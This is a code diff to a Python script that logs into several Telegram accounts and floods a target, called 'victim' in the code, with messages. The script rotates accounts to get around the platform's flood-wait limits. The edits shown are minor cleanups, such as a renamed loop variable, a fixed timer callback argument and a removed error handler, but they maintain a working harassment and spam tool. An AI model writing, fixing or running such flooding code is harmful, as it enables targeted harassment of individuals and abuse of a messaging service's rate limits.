@@ -54,7 +54,7 @@ async def start_flood(victim):
         return min(waiting_clients_timers, key=lambda timer: timer["seconds"])
 
     # An actual flood process, tqdm is for progressbar
-    for i in tqdm(range(message_count), desc="Flooding", unit="messages"):
+    for _ in tqdm(range(message_count), desc="Flooding", unit="messages"):
         # Choose client randomly from working clients list
         client = secrets.choice(clients)
 
@@ -69,7 +69,7 @@ async def start_flood(victim):
             waiting_clients.append(client)
 
             timer = Timer(error.seconds, partial(
-                remove_client_from_waiting_clients, client, timer))
+                remove_client_from_waiting_clients, client))
             waiting_clients_timers.append(
                 {"client": client, "timer": timer, "seconds": error.seconds})
 
@@ -120,24 +120,19 @@ async def main():
             def code_callback():
                 return input(f"Enter the code for {phone_number}: ")
 
-            try:
-                # Using phone_number[1:] to prevent saving "+" in phone number too
-                client = TelegramClient(
-                    f"client_{phone_number[1:]}",
-                    api_id,
-                    api_hash)
+            # Using phone_number[1:] to prevent saving "+" in phone number too
+            client = TelegramClient(
+                f"client_{phone_number[1:]}",
+                api_id,
+                api_hash)
 
-                await client.start(
-                    phone_number,
-                    password,
-                    code_callback=code_callback)
+            await client.start(
+                phone_number,
+                password,
+                code_callback=code_callback)
 
-                # Add client to working clients list
-                clients.append(client)
-            except:
-                error = sys.exc_info()[0]
-                print(
-                    f"Error while trying to log into {phone_number}: {error}")
+            # Add client to working clients list
+            clients.append(client)
 
             go_to_next_line()
 
